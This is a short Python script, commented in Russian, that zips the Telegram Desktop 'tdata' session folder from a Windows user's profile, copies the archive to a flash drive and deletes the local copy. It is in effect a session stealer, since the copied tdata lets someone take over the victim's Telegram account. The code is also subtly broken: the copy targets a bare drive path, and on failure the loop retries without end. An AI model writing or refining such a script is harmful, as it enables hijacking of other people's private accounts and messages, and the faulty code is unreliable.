import os, shutil
from zipfile import ZipFile

flash_drive_path = 'D:\\' # Укажите путь к флешке

telegram_folder = os.path.join(os.path.expanduser("~"), 'AppData', 'Roaming', 'Telegram Desktop UWP', 'tdata')
telegram_zip = os.path.join(os.path.expanduser("~"), 'tdata.zip')

telegram_online = True
message_sent = False

while telegram_online:
    try:
        f1 = os.listdir(telegram_folder)
        files = [os.path.join(telegram_folder, f) for f in f1]

        with ZipFile(telegram_zip, 'w') as z:
            for f in files:
                if os.path.isdir(f):
                    for root, dirs, files2 in os.walk(f):
                        for file in files2:
                            z.write(os.path.join(root, file))
                else:
                    z.write(f)

        flash_drive_path = os.path.join(flash_drive_path)
        shutil.copyfile(telegram_zip, flash_drive_path)
        os.remove(telegram_zip)
        telegram_online = False
    except Exception as e:
        print(e)
        if not telegram_online:
            break
        if not message_sent:
            message_sent = True
        pass